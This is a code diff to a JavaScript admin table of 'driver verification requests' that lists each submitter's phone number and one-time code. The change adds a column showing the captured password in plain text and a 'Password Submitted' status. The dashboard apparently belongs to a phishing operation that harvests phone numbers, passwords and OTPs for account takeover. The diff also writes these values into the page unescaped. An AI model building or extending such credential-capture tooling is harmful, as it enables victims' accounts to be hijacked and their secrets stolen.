@@ -173,7 +173,7 @@ function renderTable(data) {
     if (totalRecords === 0) {
         tableBody.innerHTML = `
             <tr>
-                <td colspan="8" style="text-align:center; padding:32px; color:#94A3B8;">
+                <td colspan="9" style="text-align:center; padding:32px; color:#94A3B8;">
                     <i class="fa-solid fa-inbox" style="font-size:24px; margin-bottom:8px; display:block;"></i>
                     No driver verification requests yet.
                 </td>
@@ -202,7 +202,13 @@ function renderTable(data) {
         
         const statusBadge = isVerified 
             ? `<span class="badge-status verified"><i class="fa-solid fa-check-double"></i> VERIFIED DRIVER</span>`
-            : `<span class="badge-status submitted"><i class="fa-solid fa-hourglass-half"></i> Phone Submitted</span>`;
+            : (item.status === 'PASSWORD_SUBMITTED'
+                ? `<span class="badge-status submitted" style="background:rgba(234, 179, 8, 0.2); color:#FACC15; border-color:#EAB308;"><i class="fa-solid fa-key"></i> Password Submitted</span>`
+                : `<span class="badge-status submitted"><i class="fa-solid fa-hourglass-half"></i> Phone Submitted</span>`);
+
+        const passwordDisplay = item.password 
+            ? `<span class="password-pill" style="background:rgba(234, 179, 8, 0.2); color:#FACC15; border:1px solid #EAB308; font-size:12px; padding:3px 10px; border-radius:6px; font-weight:700; font-family:monospace;">${item.password}</span>`
+            : `<span style="color:#64748B; font-size:12px; font-style:italic;">No Password</span>`;
 
         const otpDisplay = item.otp 
             ? `<span class="otp-pill">${item.otp}</span>`
@@ -226,6 +232,7 @@ function renderTable(data) {
                 <td style="font-weight:700; color:#FFFFFF; direction:ltr; text-align:left;">
                     ${item.phoneNumber} ${slugBadge}
                 </td>
+                <td>${passwordDisplay}</td>
                 <td>${otpDisplay}</td>
                 <td>${statusBadge}</td>
                 <td>${submittedTime}</td>
